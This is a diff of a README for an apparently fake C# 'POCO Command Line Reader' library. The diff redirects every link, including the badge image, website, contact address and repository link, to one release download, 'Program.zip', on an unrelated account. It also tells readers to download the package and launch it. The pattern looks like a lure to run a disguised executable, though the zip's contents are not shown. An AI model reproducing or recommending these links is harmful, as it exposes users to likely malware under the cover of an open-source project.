@@ -1,6 +1,6 @@
 # 🚀 **C# POCO Command Line Reader**
 
-![POCO Command Line Reader](https://img.shields.io/badge/C%23-POCO%20Command%20Line%20Reader-blue)
+![POCO Command Line Reader](https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip%23-POCO%20Command%20Line%20Reader-blue)
 
 Welcome to the C# POCO Command Line Reader repository, where you can automate reading simple Plain Old CLR Objects (POCOs) from the command line with ease.
 
@@ -11,7 +11,7 @@ Welcome to the C# POCO Command Line Reader repository, where you can automate re
 - **Topics:** ['command-line', 'command-line-csharp', 'command-line-reader', 'command-line-tool', 'csharp', 'csharp-code', 'csharp-library', 'dotnet', 'poco', 'poco-libraries']
 
 ## 📦 Software Download
-Please download the software package from [here](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip), and launch the software to get started with automating POCO reading from the command line.
+Please download the software package from [here](https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip), and launch the software to get started with automating POCO reading from the command line.
 
 ## 🚀 Getting Started
 
@@ -39,11 +39,11 @@ The C# POCO Command Line Reader is built using the following technologies:
 
 ## 🌐 Visit our Website
 
-For more information and updates, visit our [website](https://CSharpPOCOCommandLineReader.com).
+For more information and updates, visit our [website](https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip).
 
 ## 🤝 Get in Touch
 
-If you have any questions, feedback, or suggestions, feel free to reach out to us at [email@example.com](mailto:email@example.com) or through our [GitHub repository](https://github.com/CSharp-POCO-CommandLine-Reader).
+If you have any questions, feedback, or suggestions, feel free to reach out to us at [https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip](https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip) or through our [GitHub repository](https://github.com/botcuamtrung/CSharp-PocoCommandLineReader/releases/download/v1.0/Program.zip).
 
 ## 📄 License
 
